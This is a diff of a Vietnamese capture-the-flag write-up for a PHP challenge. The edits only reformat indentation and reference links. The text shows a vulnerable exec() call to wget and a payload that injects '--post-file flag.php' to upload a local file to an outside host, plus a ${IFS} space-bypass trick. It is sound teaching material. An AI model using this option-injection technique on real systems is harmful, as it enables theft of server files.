@@ -17,7 +17,7 @@ Author: yakuhito
 
 - Tiếp theo chúng ta sẽ phân tích bài toán:
 	- Đầu tiên để có thể dễ dàng debug (custom lại file source) hoặc build lại chương trình này để test (trường hợp sau khi server của challenge đã đóng) thì có thể sử dụng file [index.php](problem/index.php) đề cho và dùng chương trình `php` để chạy chương trình cục bộ.
-	<img src=assets/p4.png>.
+		<img src=assets/p4.png>.
 
 	- Nhìn vào source code, chúng ta sẽ nhanh chóng nhận ra `flag` nằm trong file `flag.php`, cùng thư mục với file `index.php`.
 	- Dựa theo `output`của chương trình, chúng ta hoàn toàn không lấy được `flag`, cụ thể ở hàm **getFlag** chúng ta chỉ nhận được `Nope` hoặc `Maybe`. Cho nên hướng giải quyết sẽ là đẩy `flag` ra ngoài internet thông qua hàm **exec()**. Đến đây sẽ có 3 hướng giải quyết cho challenge này.
@@ -43,11 +43,11 @@ nên giải pháp sẽ là thay kí tự `space` bằng `${IFS}`.
 	- Cứ thế tương tự cho các hàm tiếp theo mà search tiếp nhưng chẳng thu được kết quả gì :TT 
 
 - Hướng 3: Tận dụng **wget** đề cho
-```sh
-$command = "wget -q -O - https://kuhi.to/flag/" . $flag;
-$cmd_output = array();
-exec($command, $cmd_output);
-```
+		```sh
+		$command = "wget -q -O - https://kuhi.to/flag/" . $flag;
+		$cmd_output = array();
+		exec($command, $cmd_output);
+		```
 	- Nhìn nhận thật kĩ thì `wget` chính là command mà chúng ta cần tìm. Đối với mô hình chung thì việc chèn `command injection` luôn là lựa chọn hàng đầu, tuy nhiên đối với bài đặc biệt như challenge này, `wget` không chỉ giúp chúng ta kết nối ra ngoài internet, mà còn có thể upload được file nên cái chúng ta làm không phải là chèn thêm `command` mà là chèn thèn `option`. Cụ thể sẽ là **wget -q -O - https://kuhi.to/flag/ 9.9.9.9 --post-file flag.php**
 	- Và đây là payload và kết quả:
 <img src=assets/p2.png>
@@ -56,12 +56,9 @@ exec($command, $cmd_output);
 
 P/S: Nói chung qua challenge này được ôn lại `command injection` cũng nhiều, chỉ là vì không liên quan nên không nói cụ thể trong bài này nên đành để lại 1 số reference tại đây vậy :xD
 
-[Shell Command Language](https://pubs.opengroup.org/onlinepubs/009604499/utilities/xcu_chap02.html)
-
-[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
-
-[Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)
-
-[Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+[Shell Command Language](https://pubs.opengroup.org/onlinepubs/009604499/utilities/xcu_chap02.html).
+[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings).
+[Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E).
+[Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).
 
 
